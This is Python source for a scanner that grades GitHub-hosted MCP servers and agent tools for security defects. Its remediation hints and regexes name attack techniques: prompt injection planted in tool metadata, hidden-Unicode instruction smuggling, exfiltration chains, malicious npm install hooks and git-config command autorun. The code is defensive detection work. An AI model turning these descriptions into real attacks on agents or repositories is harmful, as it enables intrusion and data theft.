"""Core MCP server security scanner.

Fetches source files from GitHub repos and scans for security issues.
Designed to run against the recruitment_prospects table of discovered repos.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import posixpath
import re
from dataclasses import dataclass, field
from pathlib import Path

import httpx

from src.scanner import npm_scripts
from src.scanner.patterns import (
    AGENT_METADATA_FILES,
    AUTH_POSITIVE_PATTERNS,
    DANGEROUS_DELETE_ROOT_RE,
    DECODE_SINK_RE,
    DYNAMIC_REMOTE_LOAD_PATTERNS,
    EXEC_SINK_RE,
    EXFILTRATION_PATTERNS,
    EXTENSIONLESS_SCAN_FILES,
    FILE_READ_RE,
    FS_ACCESS_PATTERNS,
    INLINE_CODE_DANGER_RE,
    INSECURE_DESERIALIZATION_PATTERNS,
    INSTALL_SCRIPT_DANGER_RE,
    INVISIBLE_UNICODE_PATTERNS,
    MANIFEST_EXEC_PATTERNS,
    METADATA_INJECTION_PATTERNS,
    NET_READ_RE,
    NPM_INSTALL_HOOKS,
    OBFUSCATION_PATTERNS,
    OUTBOUND_SEND_RE,
    PEM_BODY_RE,
    PROMPT_INJECTION_PATTERNS,
    SECRET_PATTERNS,
    SENSITIVE_READ_RE,
    SKIP_DIRS,
    SKIP_EXTENSIONS,
    SOURCE_EXTENSIONS,
    SSRF_DYNAMIC_FETCH_RE,
    SSRF_GUARD_RE,
    SSRF_TOOL_SURFACE_RE,
    SSRF_URL_INPUT_RE,
    UNSAFE_EXEC_PATTERNS,
    UNTRUSTED_INPUT_RE,
    ZERO_WIDTH_RUN_NAME,
    ZERO_WIDTH_RUN_RE,
)
from src.scanner.prefilter import AnyOf, LineFilter

# Inline suppression marker — append to any line to skip scanning it
_SUPPRESSION_COMMENT = "ag-scan:ignore"

# Allowlist file path (JSON array of {file_path, name} objects to skip)
_ALLOWLIST_PATH = Path(__file__).parent / "allowlist.json"

logger = logging.getLogger(__name__)

_TIMEOUT = 30
_MAX_FILE_SIZE = 500_000  # 500KB — skip huge files
_MAX_FILES_PER_REPO = 200  # don't scan massive monorepos


_REMEDIATION_HINTS: dict[str, str] = {
    "secret": "Move to environment variable or secrets manager",
    "unsafe_exec": "Validate and sanitize input before execution",
    "fs_access": "Restrict paths to allowed directories",
    "exfiltration": "Add authentication to outbound data endpoints",
    "obfuscation": "Replace obfuscated code with readable equivalent",
    "dependency": "Update to a patched version or find an alternative package",
    "dynamic_remote_load": (
        "Pin remote payloads by commit SHA / content hash and never eval/exec fetched "
        "content — a mutable remote URL can be swapped after integration (rug-pull)"
    ),
    "hidden_unicode": (
        "Remove invisible/bidi/tag Unicode — it can smuggle instructions a human reviewer "
        "never sees (prompt injection)"
    ),
    "prompt_injection": (
        "Remove instruction-override / hidden-directive text from tool descriptions and "
        "metadata — it poisons the agent that reads the tool"
    ),
    "insecure_deserialization": (
        "Never deserialize untrusted data with pickle/marshal/dill/yaml.load — use a "
        "safe format (JSON) or yaml.safe_load / allow_pickle=False"
    ),
    "install_hook": (
        "Audit npm pre/post-install lifecycle scripts — they auto-run on `npm install` "
        "and are a top supply-chain vector; avoid fetching/executing remote content there"
    ),
    "toxic_flow": (
        "This tool combines private-data access, untrusted-input ingestion, and outbound "
        "send — the prompt-injection→exfiltration chain. Isolate the capabilities: don't "
        "let untrusted content reach an outbound path that can carry secrets"
    ),
    "git_autorun": (
        "This repo ships a git-config that executes a command on ordinary git operations "
        "(the GitSpawn class — a plain `git status`/`clone` becomes code execution). Remove "
        "the committed .git/config or .gitconfig; never ship core.fsmonitor / core.hooksPath "
        "/ core.sshCommand or `!`-shell aliases in a repo"
    ),
}


@dataclass
class Finding:
    """A single security finding."""

    category: str  # "secret", "unsafe_exec", "fs_access"
    name: str
    severity: str  # "critical", "high", "medium", "low", "info"
    file_path: str
    line_number: int
    snippet: str  # surrounding context (redacted for secrets)
    remediation: str = ""  # actionable fix suggestion
    # For dependency (OSV) findings only: "direct" = a manifest-declared production
    # dependency (full weight); "transitive" = pulled in by another dep (sub-weighted
    # in _dependency_penalty, since it's less reachable). Defaults "direct" so any
    # finding that can't determine reachability keeps FULL weight (never hides a CVE).
    reachability: str = "direct"
    # Precision pass: "defect" is something a reviewer would agree is wrong;
    # "capability" is something the tool DOES (fixed-argv spawn, eval of its own
    # expressions, pickle of a local cache, rmtree) — reported so nothing is hidden,
    # but never scored and never blocking. Capability severities are info|low only.
    kind: str = "defect"
    # Taxonomy tag for a capability (process:spawn, code:eval, data:deserialize,
    # filesystem:delete, secret:pem_handling, binary:hex_literal); "" for defects.
    capability: str = ""
    # False when the file is NOT part of what a consumer installs (an sdist's
    # Makefile / scripts/ / bench/ / tox.ini, or any file absent from the wheel).
    # Non-installed findings are capped at severity "info" and never block.
    installed: bool = True
    # True when the finding sits in test-only code INSIDE an otherwise-shipped file (an
    # inline Rust ``#[cfg(test)] mod``): graded like a finding under tests/.
    test_code: bool = False
    # True for a payload-shaped defect (download+exec, pipe-to-shell, decoded or
    # obfuscated exec, credential exfil, untrusted input reaching a sink, a provider
    # secret) in a file that is otherwise downgraded: a test / doc / example dir shipped
    # inside a published artifact, where the runtime code can import it. It keeps its
    # severity and is graded as shipped code wherever it sits (``_scan_content``'s
    # ``payloads_full_severity``).
    payload: bool = False


@dataclass
class ScanResult:
    """Result of scanning one repository."""

    repo: str
    stars: int
    description: str
    framework: str
    findings: list[Finding] = field(default_factory=list)
    positive_signals: list[str] = field(default_factory=list)
    # A fuller "what it does" second line (mined from the README) shown beneath a terse
    # maintainer tagline; empty when there's no distinct extra detail to add.
    long_description: str = ""
    files_scanned: int = 0
    # Coverage disclosure (#4): total scannable files BEFORE the _MAX_FILES_PER_REPO cap,
    # and whether the signed grade is only a sample of the repo. Surfaced in the attestation
    # so a partial-coverage grade is never presented as an authoritative whole-repo verdict.
    total_scannable_files: int = 0
    sampled: bool = False
    # What the scan selected but could NOT read, by cause (only non-zero keys): files
    # over the 500 KB read cap, fetches that failed or timed out, files left unread at
    # the time budget, files past the file cap, a truncated GitHub tree, package members
    # skipped by the bounded unpack, unread dependency files, a failed advisory lookup.
    # Disclosure only (never a score or decision input): signed as scan.coverageGaps and
    # stated beside every answer (src/scanner/verdict.py coverage_gap_notes).
    coverage_gaps: dict = field(default_factory=dict)
    has_readme: bool = False
    has_license: bool = False
    has_tests: bool = False
    primary_language: str = ""
    suppressed_count: int = 0  # lines with ag-scan:ignore
    trust_score: int = 0  # 0-100, computed after scan
    category_scores: dict[str, int] = field(default_factory=dict)  # per-category 0-100
    is_mcp_server: bool = False  # context-aware: MCP servers have expected tool patterns
    is_media_tool: bool = False  # context-aware: audio/TTS/video tools have expected fs patterns
    # #8 tool-definition pinning: canonical digest per agent/tool manifest, so a re-scan
    # can prove a tool definition drifted (rug-pull) even if the code still scans clean.
    # path -> "sha256:..."; on the live MCP surface the key is "tool:<name>"
    tool_digests: dict[str, str] = field(default_factory=dict)
    tool_manifest_digest: str | None = None  # combined digest folded into the attestation
    # The served tools as a display list: name + declared annotations (+ digest where
    # we hold the full definition). Unsigned; see src/scanner/mcp_tool_list.py.
    tool_list: list[dict] = field(default_factory=list)
    # Phase 0/1 supply-chain: the recompute-discipline coverage block (surface,
    # scan_depth, db_snapshots, point_in_time) and the OSV/deps.dev summary. Both
    # are additive — a scan with the OSV pipeline disabled/unreachable leaves them
    # at their empty defaults and behaves exactly as before.
    coverage: dict = field(default_factory=dict)
    supply_chain: dict = field(default_factory=dict)
    # Context-only incident history (OSV MAL- advisories for the TARGET's own coordinate —
    # "was this package ever compromised?"). NEVER scored, NEVER signed — historical
    # context alongside the verdict. Empty for repos with no package coordinate / non-OSV
    # ecosystems / when the lookup fails (fail-open).
    incident_history: dict = field(default_factory=dict)
    # The registry's end-of-life signal for a package (npm deprecated / PyPI yanked or
    # Inactive); None when the maintainer has not retired it. Also raised as a finding.
    deprecation: str | None = None
    # Phase 2 artifact scanning: repo↔artifact drift summary + a compact summary of
    # the published-artifact fetch/scan. Both stay empty for repo-only scans (the
    # feature is flag-gated), so existing behaviour is unchanged.
    drift: dict = field(default_factory=dict)
    artifact_scan: dict = field(default_factory=dict)
    # The published-package coordinate this repo maps to (surface + registry name),
    # resolved from the root manifest — independent of whether the (flag-gated,
    # sometimes-flaky) artifact fetch succeeds. Lets the UI offer package / stdio
    # 1-click install for a repo that IS a package (e.g. an MCP server on PyPI).
    package_coordinate: dict = field(default_factory=dict)
    # Phase 3 provenance verification summary (empty for scans without a verified
    # coordinate; flag-gated). Declared here so trust-score/service reads are safe
    # even when the provenance pass never runs.
    provenance: dict = field(default_factory=dict)
    # Phase 5 maintainer/behavioral signals summary (empty unless the flag is on;
    # GitHub-metadata only). Declared here so trust-score reads are safe even when
    # the maintainer pass never runs.
    maintainer: dict = field(default_factory=dict)
    # A+ "Certified" tier eligibility (roadmap §7): {eligible, checks{}}. Dormant
    # (eligible=False) until artifact-scan + provenance are enabled — that's the
    # design (A+ requires the cryptographic signals). Never lowers a grade.
    certified: dict = field(default_factory=dict)
    # Declared-scope manifest (.agentavow.yml): the tool's own declaration of intended
    # egress/capabilities. Surfaced on the score page; the behavioral tier verifies it.
    declared_scope: dict = field(default_factory=dict)
    # Env var names the package reads (process.env.X / os.environ["X"]); canary targets
    # for the behavioral tier. Package scans only; empty elsewhere.
    env_reads: list[str] = field(default_factory=list)
    error: str | None = None

    # Severity counts cover DEFECTS only: a capability finding (kind="capability") is
    # visible in `findings` / `capabilities` but is never a critical/high/medium.
    @property
    def critical_count(self) -> int:
        return sum(1 for f in self.findings
                   if f.severity == "critical" and _is_defect(f))

    @property
    def high_count(self) -> int:
        return sum(1 for f in self.findings
                   if f.severity == "high" and _is_defect(f))

    @property
    def medium_count(self) -> int:
        return sum(1 for f in self.findings
                   if f.severity == "medium" and _is_defect(f))

    @property
    def capabilities(self) -> list[dict]:
        """What the tool DOES, grouped by taxonomy tag — the informational chips next
        to the score. Derived from kind="capability" findings; never a score input."""
        return _capability_summary(self.findings)

    # "Blocking" counts — findings in SHIPPED code (or known-malicious anywhere). These
    # drive the headline grade/tier/number so all surfaces agree about a real critical,
    # instead of the number discounting a non-shipped finding the letter still caps on.
    @property
    def shipped_critical_count(self) -> int:
        return sum(1 for f in self.findings
                   if f.severity == "critical" and _finding_is_blocking(f))

    @property
    def shipped_high_count(self) -> int:
        return sum(1 for f in self.findings
                   if f.severity == "high" and _finding_is_blocking(f))


def _is_defect(f: object) -> bool:
    """True for a finding that can move the score (everything except a capability)."""
    return getattr(f, "kind", "defect") != "capability"


def _capability_summary(findings: list) -> list[dict]:
    """Group capability findings by tag: ``[{capability, label, count, files}]``."""
    from src.scanner.exec_classify import CAPABILITY_LABELS

    groups: dict[str, dict] = {}
    for f in findings:
        if getattr(f, "kind", "defect") != "capability":
            continue
        tag = getattr(f, "capability", "") or "other"
        g = groups.setdefault(tag, {
            "capability": tag,
            "label": CAPABILITY_LABELS.get(tag, tag),
            "count": 0,
            "files": [],
        })
        g["count"] += 1
        path = getattr(f, "file_path", "") or ""
        if path and path not in g["files"] and len(g["files"]) < 5:
            g["files"].append(path)
    return sorted(groups.values(), key=lambda g: (-g["count"], g["capability"]))


def _should_skip_path(path: str) -> bool:
    """Check if a file path should be skipped."""
    # Never skip a shipped git-config or git hook — both are GitSpawn autorun vectors, so
    # we must inspect them even though .git/ is otherwise a skipped directory.
    if _is_git_config_file(path) or _is_git_hook_file(path):
        return False
    parts = Path(path).parts
    for part in parts:
        if part in SKIP_DIRS:
            return True
    ext = Path(path).suffix.lower()
    if ext in SKIP_EXTENSIONS:
        return True
    # Also skip if it looks like a minified file
    name = Path(path).name.lower()
    if ".min." in name:
        return True
    return False


# Directory markers for throwaway / non-shipped lockfiles. A vuln in a monorepo's
# example app or test fixture must NOT drag down the grade of the package it
# actually publishes — those deps are never installed by a consumer of the tool.
_NON_PROD_DIR_MARKERS = frozenset({
    "example", "examples", "demo", "demos", "sample", "samples",
    "test", "tests", "__tests__", "e2e", "integration", "fixture", "fixtures",
    "benchmark", "benchmarks", "bench", "benches", "docs", "doc", "website", "site",
    "playground", "sandbox", "scripts", "tooling", "release",
})


def _is_production_lockfile(path: str) -> bool:
    """True if a lockfile path looks like a shipped/production manifest, not an
    example/test/fixture one. Root-level lockfiles always count."""
    parts = [p.lower() for p in Path(path).parts[:-1]]  # dirs only
    return not any(p in _NON_PROD_DIR_MARKERS for p in parts)


# A finding in non-shipped code (tests, fixtures, examples, benchmarks, docs,
# scripts) is not the surface an agent connects to — it counts at a fraction of a
# shipped finding, so a large monorepo's test/fixture noise can't collapse the grade
# of what it actually ships. (This is why react-scale repos previously graded D.)
_NONSHIPPED_FINDING_WEIGHT = 0.15


def _is_nonshipped_path(path: str) -> bool:
    """True if the file lives under a non-shipped directory (test/fixture/example/
    benchmark/docs/scripts/…) — reuses the lockfile non-prod dir taxonomy."""
    parts = [p.lower() for p in Path(path).parts[:-1]]  # dirs only
    return any(p in _NON_PROD_DIR_MARKERS for p in parts)


def _finding_grade_weight(f) -> float:
    """Score weight for one finding: 1.0 for shipped code, a fraction for non-shipped.

    Non-shipped covers both dir-based (tests/, examples/, docs/ …) AND file-based
    test conventions (foo_test.go, foo.test.ts, foo.spec.js) that live next to
    source — those are the tool's tests, not the surface an agent connects to.
    """
    return _NONSHIPPED_FINDING_WEIGHT if _finding_is_discounted(f) else 1.0


def _finding_is_discounted(f) -> bool:
    """Whether a finding's SCORE weight is discounted (``_NONSHIPPED_FINDING_WEIGHT``):
    the broad non-shipped taxonomy (test/doc/example/benchmark/scripts/tooling dirs,
    demo/sample filenames, infra/installer scripts, inline test modules). Weight only:
    whether a finding is shipped (and can block) is ``finding_is_shipped``."""
    if getattr(f, "payload", False):
        return False
    path = getattr(f, "file_path", "") or ""
    return bool(_is_nonshipped_path(path) or _is_test_or_doc_file(path)
                or _is_unshipped_script(path) or getattr(f, "test_code", False))


def finding_is_shipped(f) -> bool:
    """Whether a finding sits in the shipped surface (the public ``shipped`` tag).

    The SAME location rule ``_finding_is_blocking`` uses, so a finding the page tags
    ``shipped: false`` never decides the answer and one that decides is never tagged
    not-shipped (they used to disagree: ``scripts/``, ``tooling/``, ``demo_*.py`` were
    tagged not-shipped yet blocked). False only when the location is honestly not
    what a consumer runs: a file absent from the published artifact (``installed``,
    computed from the artifact's file list), an inline test module, a test / fixture /
    docs / example / benchmark dir or a co-located test file, a CI/release-infra or
    one-time installer script. Author-controlled names an entry point can hide behind
    (``scripts/``, ``tooling/``, ``sandbox/``, ``demo_*``) stay shipped. A
    payload-shaped defect is shipped wherever it sits in an artifact."""
    if getattr(f, "payload", False):
        return True
    if not getattr(f, "installed", True) or getattr(f, "test_code", False):
        return False
    path = getattr(f, "file_path", None)
    if not path:
        return True
    return not (_is_blocking_exempt_path(path) or _is_unshipped_script(path))


def _is_source_file(path: str) -> bool:
    """Check if a file should be scanned for source patterns."""
    ext = Path(path).suffix.lower()
    if ext in SOURCE_EXTENSIONS:
        return True
    # Check extensionless files by name (Dockerfile, Makefile, etc.)
    filename = Path(path).name
    if filename in EXTENSIONLESS_SCAN_FILES:
        return True
    # Agent metadata files (SKILL.md etc.) — the tool's instruction surface
    return filename.lower() in AGENT_METADATA_FILES


def _redact_secret(line: str, match: re.Match) -> str:  # type: ignore[type-arg]
    """Redact the actual secret value from the snippet."""
    start, end = match.span()
    # Show first 4 and last 4 chars of match, redact middle
    matched = match.group()
    if len(matched) > 12:
        redacted = matched[:4] + "..." + matched[-4:]
    else:
        redacted = matched[:2] + "***"
    return line[:start] + redacted + line[end:]


def _detect_language(files: list[dict]) -> str:
    """Detect primary language from file extensions.

    Only counts *real programming-language* extensions (the keys of ``lang_map``) —
    config/data files (.json/.yaml/.toml/.ini/…) are NOT languages, so a TypeScript
    repo full of package.json/tsconfig.json no longer reports its primary language as
    ".json".
    """
    lang_map = {
        ".py": "Python", ".ipynb": "Python",
        ".js": "JavaScript", ".mjs": "JavaScript", ".cjs": "JavaScript",
        ".jsx": "JavaScript",
        ".ts": "TypeScript", ".tsx": "TypeScript",
        ".go": "Go", ".rs": "Rust", ".rb": "Ruby",
        ".java": "Java", ".kt": "Kotlin", ".cs": "C#",
        ".php": "PHP", ".swift": "Swift", ".scala": "Scala",
        ".lua": "Lua", ".pl": "Perl", ".pm": "Perl", ".r": "R",
        ".groovy": "Groovy",
        ".sh": "Shell", ".bash": "Shell", ".zsh": "Shell",
    }
    ext_counts: dict[str, int] = {}
    for f in files:
        ext = Path(f.get("path", "")).suffix.lower()
        if ext in lang_map:
            ext_counts[ext] = ext_counts.get(ext, 0) + 1

    if not ext_counts:
        return "unknown"
    top_ext = max(ext_counts, key=ext_counts.get)  # type: ignore[arg-type]
    return lang_map[top_ext]


class _BlobList(list):
    """The scannable tree, plus the blobs over the per-file size cap in ``oversized``:
    ``scan_repo`` reads their head and tail (``_oversized_scan_files``), so a padded file
    is disclosed instead of silently dropped. Every other consumer sees the plain list."""

    oversized: list[dict]


def _tree_blobs(tree: list[dict], oversized_out: list | None = None) -> list[dict]:
    """Keep only blob (file) entries under the per-file size cap (the rest ride along in
    ``.oversized``, and are also appended to ``oversized_out`` for the coverage
    disclosure when given)."""
    out = _BlobList(
        item for item in tree
        if item.get("type") == "blob"
        and item.get("size", 0) <= _MAX_FILE_SIZE
    )
    out.oversized = [item for item in tree
                     if item.get("type") == "blob" and item.get("size", 0) > _MAX_FILE_SIZE]
    if oversized_out is not None:
        oversized_out.extend(out.oversized)
    return out


async def _note_github(resp: httpx.Response, context: str) -> None:
    """Route a metered GitHub response through real-time rate-limit protection.

    Fires throttled admin alerts and maintains the ``github_budget_low``
    degradation flag off the response's ``X-RateLimit-*`` headers, and — when
    GitHub signals a 403/429 rate limit — backs off (honoring Retry-After /
    reset, capped by config) rather than hammering. Best-effort; never raises,
    so rate-limit protection can't itself break a scan.
    """
    try:
        from src.jobs.scan_health import note_github_response

        backoff = await note_github_response(
            resp.status_code, resp.headers, context=context,
        )
    except Exception:
        logger.debug("github rate-limit note failed", exc_info=True)
        return
    if backoff and backoff > 0:
        import asyncio

        from src.config import settings

        cap = getattr(settings, "scanner_ratelimit_backoff_cap_seconds", 5.0)
        await asyncio.sleep(min(backoff, cap))


async def _fetch_repo_tree(
    owner: str, repo: str, token: str | None = None,
    meta_out: dict | None = None,
) -> tuple[list[dict], bool, bool, str | None]:
    """Fetch the file tree of a repo via GitHub API.

    Returns ``(files, truncated, repo_ok, ref)``:

    - ``files``     — blob (file) entries under the per-file size cap.
    - ``truncated`` — GitHub could not return the *whole* tree. Very large
      monorepos (e.g. ``block/goose``, ``supabase-community/supabase-mcp``)
      come back with ``{"truncated": true}`` — a partial but real tree — or
      the recursive ``git/trees`` call errors outright. Either way the caller
      scans what WAS returned and flags the grade as *sampled* rather than an
      authoritative whole-repo verdict.
    - ``repo_ok``   — the repo metadata endpoint returned 200 (repo exists and
      is reachable). When False the repo is genuinely missing / private /
      unreachable and the caller surfaces a real error. When True but ``files``
      is empty we still SUCCEEDED — the caller degrades to a graceful (empty /
      partial) result instead of turning a big-monorepo tree failure into a 502.
    - ``ref``       — the repo's default branch, or ``None`` when the tree fetch
      failed. Threaded into :func:`_fetch_file_content` so bulk content reads can
      go through the unmetered ``raw.githubusercontent.com`` host.
    """
    headers = {"Accept": "application/vnd.github+json"}
    if token:
        headers["Authorization"] = f"token {token}"

    # follow_redirects: GitHub 301s a renamed/moved repo's API to its canonical
    # location (this is why facebook/react 502'd). Follow it so a moved repo still
    # scans instead of being mistaken for "not found".
    async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
        # Get default branch — this call also confirms the repo is real/public.
        try:
            resp = await client.get(
                f"https://api.github.com/repos/{owner}/{repo}",
                headers=headers,
            )
        except httpx.HTTPError as exc:
            logger.warning("GitHub repo API error for %s/%s: %s", owner, repo, exc)
            return [], False, False, None
        # Real-time rate-limit protection (metered call): alert + degrade flag.
        await _note_github(resp, f"repo metadata {owner}/{repo}")
        if resp.status_code != 200:
            logger.warning(
                "GitHub repo API returned %d for %s/%s (rate_remaining=%s, auth=%s)",
                resp.status_code, owner, repo,
                resp.headers.get("x-ratelimit-remaining", "?"),
                "yes" if token else "no",
            )
            return [], False, False, None
        _repo_json = resp.json()
        default_branch = _repo_json.get("default_branch", "main")
        # Surface the repo's own metadata (description + stars) so the caller can show
        # "what this tool does" and populate adoption without a second API call.
        if meta_out is not None:
            meta_out["description"] = _repo_json.get("description")
            meta_out["stars"] = _repo_json.get("stargazers_count")

        tree_url = (
            f"https://api.github.com/repos/{owner}/{repo}/git/trees/{default_branch}"
        )

        # Recursive tree fetch. For very large monorepos GitHub may cap the
        # response (truncated:true) or error outright — either way the repo is
        # real, so we degrade to a partial/sampled tree, never a hard failure.
        resp = None
        try:
            resp = await client.get(
                tree_url, headers=headers, params={"recursive": "1"},
            )
        except httpx.HTTPError as exc:
            logger.warning("GitHub tree API error for %s/%s: %s", owner, repo, exc)

        if resp is not None:
            # Real-time rate-limit protection (metered call): alert + degrade flag.
            await _note_github(resp, f"repo tree {owner}/{repo}")

        # Blobs over the read cap, for the coverage disclosure (meta_out["oversized"]),
        # and the git tree sha: a content digest of exactly the tree that was listed.
        _oversized: list | None = None
        if meta_out is not None:
            _oversized = meta_out.setdefault("oversized", [])

        if resp is not None and resp.status_code == 200:
            body = resp.json()
            if meta_out is not None and isinstance(body.get("sha"), str):
                meta_out["tree_sha"] = body["sha"]
            return (
                _tree_blobs(body.get("tree", []), _oversized),
                bool(body.get("truncated")),
                True,
                default_branch,
            )

        if resp is not None:
            logger.warning(
                "GitHub tree API returned %d for %s/%s (rate_remaining=%s) — "
                "degrading to a shallow (root-level) sampled tree",
                resp.status_code, owner, repo,
                resp.headers.get("x-ratelimit-remaining", "?"),
            )

        # Fallback: a non-recursive (root-level) tree still yields a real, if
        # shallow, sample for a monorepo whose recursive tree was unavailable.
        # The repo is known-good (metadata returned 200), so this is a degraded
        # SUCCESS (truncated=True), not an error → no 502.
        try:
            shallow = await client.get(tree_url, headers=headers)
            # Real-time rate-limit protection (metered call): alert + degrade flag.
            await _note_github(shallow, f"repo shallow tree {owner}/{repo}")
            if shallow.status_code == 200:
                return (
                    _tree_blobs(shallow.json().get("tree", []), _oversized),
                    True,
                    True,
                    default_branch,
                )
        except httpx.HTTPError as exc:
            logger.warning(
                "GitHub shallow tree API error for %s/%s: %s", owner, repo, exc,
            )

        # No tree at all, but the repo exists — empty-but-successful result.
        return [], True, True, default_branch


async def _fetch_file_content(
    owner: str, repo: str, path: str, token: str | None = None,
    ref: str | None = None,
) -> str | None:
    """Fetch raw file content from GitHub.

    When ``ref`` is known and the raw-content optimization is enabled
    (``settings.scanner_use_raw_content``), fetch via ``raw.githubusercontent.com``
    first. That host is UNMETERED — it does not consume the GitHub API
    rate-limit budget — so routing the bulk per-file reads through it cuts the
    dominant ~1-API-call-per-file cost of a scan. Any non-200 (private repos
    404 on unauthenticated raw; transient raw misses) falls back to the
    authenticated Contents API so private/edge cases still resolve.
    """
    from src.config import settings

    async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
        # Unmetered fast path: raw.githubusercontent (public repos, no auth).
        if ref and getattr(settings, "scanner_use_raw_content", True):
            raw_url = (
                f"https://raw.githubusercontent.com/{owner}/{repo}/{ref}/{path}"
            )
            try:
                raw_resp = await client.get(raw_url)
                if raw_resp.status_code == 200:
                    return raw_resp.text
            except httpx.HTTPError:
                pass  # fall through to the authenticated Contents API

        # Authenticated Contents API fallback (private repos / raw 404s).
        headers = {"Accept": "application/vnd.github.raw+json"}
        if token:
            headers["Authorization"] = f"token {token}"
        resp = await client.get(
            f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            headers=headers,
        )
        # Real-time rate-limit protection (metered fallback): alert + degrade flag.
        await _note_github(resp, f"contents {owner}/{repo}/{path}")
        if resp.status_code == 200:
            return resp.text
    return None


def _load_allowlist() -> set[tuple[str, str]]:
    """Load the false-positive allowlist from disk.

    Returns a set of (file_path_glob, finding_name) tuples.
    Each entry suppresses the named finding for matching file paths.
    """
    if not _ALLOWLIST_PATH.exists():
        return set()
    try:
        data = json.loads(_ALLOWLIST_PATH.read_text())
        return {(e["file_path"], e["name"]) for e in data if "file_path" in e and "name" in e}
    except Exception:
        logger.warning("Failed to load scanner allowlist from %s", _ALLOWLIST_PATH)
        return set()


def _is_allowlisted(
    file_path: str, finding_name: str, allowlist: set[tuple[str, str]],
) -> bool:
    """Check if a finding is allowlisted.

    Supports exact match and simple glob patterns (* at end).
    """
    for pattern, name in allowlist:
        if name != finding_name:
            continue
        if pattern == file_path:
            return True
        # Simple glob: "src/utils/*" matches "src/utils/helpers.py"
        if pattern.endswith("*") and file_path.startswith(pattern[:-1]):
            return True
    return False


# ---------------------------------------------------------------------------
# Context-aware checks — reduce false positives for safe usage patterns
# ---------------------------------------------------------------------------

# Exec-family argv classification (precision pass #2): the old "hardcoded string list
# → safe" / "well-known binary → safe" regexes were replaced by
# src/scanner/exec_classify.py, which sees the WHOLE call (multi-line), understands
# shell=True / sh -c / node -e / python -c / curl / URLs, and reports a fixed-argv
# spawn as a capability instead of silently skipping it.
_PY_EXEC_CALL_RE = re.compile(
    r"(?:subprocess\.(run|Popen|call|check_output|check_call)|os\.(system|popen))\s*\(",
)
_JS_EXEC_CALL_RE = re.compile(
    r"(?:(?<![.\w$])|(?:child_process|cp)\s*\.\s*)"
    r"(execSync|spawnSync|execFileSync|execFile|exec|spawn|fork)\s*\(",
)
_JS_CP_FUNCS = r"(execSync|spawnSync|execFileSync|execFile|exec|spawn|fork)"
_JS_CP_MODULE = r"""['"](?:node:)?child_process['"]"""
# Names a file binds to the child_process module: `const proc = require('child_process')`,
# `import * as proc from 'node:child_process'`, `import proc from 'child_process'`.
_JS_CP_ALIAS_RE = re.compile(
    r"(?:\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*require\s*\(\s*" + _JS_CP_MODULE + r"\s*\)"
    r"|\bimport\s+(?:\*\s+as\s+)?([A-Za-z_$][\w$]*)\s+from\s+" + _JS_CP_MODULE + r")",
)


def _js_cp_call_re(content: str) -> re.Pattern[str]:
    """Calls through the child_process module that `_JS_EXEC_CALL_RE` cannot see because
    they are method calls: the inline `require('child_process').exec(...)` one-liner and
    `<alias>.spawn(...)` for any alias this file binds. Before the precision pass the
    bare import was a file-wide high, which hid these; now that the import is only a
    capability, the calls themselves must be classified. Group 1 is the function name."""
    # (Both alias forms name the module, so a file without it has no alias.)
    aliases = ({a for m in _JS_CP_ALIAS_RE.finditer(content) for a in m.groups() if a}
               if "child_process" in content else set())
    quals = [r"require\s*\(\s*" + _JS_CP_MODULE + r"\s*\)"]
    quals += [r"(?<![\w$.])" + re.escape(a) for a in sorted(aliases)]
    return re.compile(r"(?:" + "|".join(quals) + r")\s*\.\s*" + _JS_CP_FUNCS + r"\s*\(")


# Child-process function names that are also common local identifiers.
_JS_AMBIGUOUS_CP = frozenset({"exec", "spawn", "fork"})


def _js_defines_locally(content: str, name: str) -> bool:
    """Does this JS file bind ``name`` itself — ``function exec(``, ``const exec = (…)
    =>`` (not a ``require``/``import``), or a parameter ``function (exec)`` /
    ``(exec) =>``? Used only when the file never mentions child_process: then a bare
    ``exec(…)`` is that local function (wrap-ansi's line wrapper, a callback)."""
    if name not in content:  # every pattern below needs the name verbatim
        return False
    n = re.escape(name)
    if re.search(r"\bfunction\s*\*?\s*" + n + r"\s*\(", content):
        return True
    for m in re.finditer(r"\b(?:const|let|var)\s+" + n + r"\s*=([^;\n]{0,120})", content):
        if not re.search(r"\brequire\s*\(|\bimport\s*\(|\bprocess\b", m.group(1)):
            return True
    param = r"\(\s*(?:[^()]*?[,\s])?" + n + r"\s*(?:[,=)][^()]*)?\)"
    return bool(re.search(r"\bfunction\b[^(\n]{0,40}" + param + r"|" + param + r"\s*=>", content))
_PY_EVAL_CALL_RE = re.compile(r"(?<![.\w])(eval|exec)\s*\(")
_PY_DESER_CALL_RE = re.compile(
    r"\b(?:cPickle|_pickle|pickle|marshal|dill|jsonpickle)\.(loads?|decode)\s*\(",
)
_NP_LOAD_CTX_RE = re.compile(r"(?<![\w.])(?:np|numpy|\w+)\.load\s*\(|(?<![\w.])load\s*\(")
_RUAMEL_UNSAFE_RE = re.compile(r"""typ\s*=\s*\[?\s*['"]unsafe['"]""")


def _ruamel_safe_receiver(content: str, line: str) -> bool:
    """``x.load(...)`` where ``x`` is bound to ruamel.yaml's ``YAML()`` in this file
    (default typ='rt', a safe loader) and nothing in the file asks for typ='unsafe'."""
    m = re.search(r"\b(\w+)\.(?:unsafe_)?load(?:_all)?\s*\(", line)
    if not m or "unsafe_load" in line or _RUAMEL_UNSAFE_RE.search(content):
        return False
    recv = re.escape(m.group(1))
    return bool(re.search(r"\b" + recv + r"\s*=\s*(?:ruamel\.yaml\.)?YAML\s*\(", content))


_FS_RW_RULES = frozenset({
    "Unrestricted file read (Python)", "Unrestricted file write (Python)",
    "fs.readFileSync / writeFileSync (Node.js)",
})
_RMTREE_CALL_RE = re.compile(r"(shutil\.rmtree|fs\.rm(?:Sync)?|rimraf(?:\.sync)?)\s*\(")
_DEF_EVAL_EXEC_RE = re.compile(r"(?:async\s+)?def\s+(?:eval|exec)\s*\(")
_PY_ASSIGN_RE_CACHE: dict[str, re.Pattern[str]] = {}
_UNTRUSTED_WINDOW = 45   # lines: "untrusted input nearby" for the dynamic-argv rules
_HEX_SINK_WINDOW = 3     # lines: an exec/decode sink this close makes a hex blob execution
_HEX_SINK_RE = re.compile(
    r"\b(?:exec|eval|Function|fromhex|unhexlify|b64decode|decompress|compile)\s*\(|vm\.run",
)
_HEX_SKIP_LANGS = frozenset({"rust", "go", "java"})
